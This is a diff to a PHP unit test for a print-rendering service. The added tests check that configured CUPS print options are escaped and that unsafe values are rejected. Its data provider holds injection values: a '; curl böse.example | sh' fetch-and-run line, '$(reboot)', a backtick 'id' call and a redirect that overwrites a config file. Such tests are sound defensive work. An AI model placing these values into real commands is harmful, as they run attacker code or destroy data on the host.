@@ -70,8 +70,38 @@ final class RenderServiceTest extends TestCase
     {
         $service = new RenderService($this->config());
 
-        $this->assertSame("lp -o PageSize=w288h432-div2 -o landscape -o fit-to-page '/x.jpg'", $service->stripPrintCommand("lp -o landscape -o fit-to-page '/x.jpg'"));
+        $this->assertSame("lp -o 'PageSize=w288h432-div2' -o landscape -o fit-to-page '/x.jpg'", $service->stripPrintCommand("lp -o landscape -o fit-to-page '/x.jpg'"));
         $this->assertSame('/usr/bin/custom-print /x.jpg', $service->stripPrintCommand('/usr/bin/custom-print /x.jpg'), 'nur lp wird ergänzt');
+    }
+
+    /**
+     * @return array<string, array{string}>
+     */
+    public static function unsafePrintOptionsProvider(): array
+    {
+        return [
+            'Befehl anhängen' => ['-o PageSize=w288h432-div2; curl böse.example | sh'],
+            'Befehl einsetzen' => ['-o PageSize=$(reboot)'],
+            'Backticks' => ['-o PageSize=`id`'],
+            'Umleitung' => ['-o PageSize=a > /app/config/layers/box.json'],
+            'anderer Schalter' => ['-d anderer-drucker'],
+        ];
+    }
+
+    /**
+     * Die Option steht in den Einstellungen, landet aber in einem Shell-Befehl: nur reine CUPS-Optionen zählen.
+     */
+    #[\PHPUnit\Framework\Attributes\DataProvider('unsafePrintOptionsProvider')]
+    public function testUnsafeStripPrintOptionsAreIgnored(string $options): void
+    {
+        $service = new RenderService($this->config(['render' => ['strip_print_options' => $options]]));
+
+        $this->assertSame("lp '/x.jpg'", $service->stripPrintCommand("lp '/x.jpg'"));
+    }
+
+    public function testSeveralPrintOptionsAreEscapedOneByOne(): void
+    {
+        $this->assertSame("-o 'PageSize=w288h432-div2' -o 'MediaType=Glossy'", RenderService::safePrintOptions('-o PageSize=w288h432-div2  -o MediaType=Glossy'));
     }
 
     public function testUnreachableServiceReportsFailureInsteadOfThrowing(): void
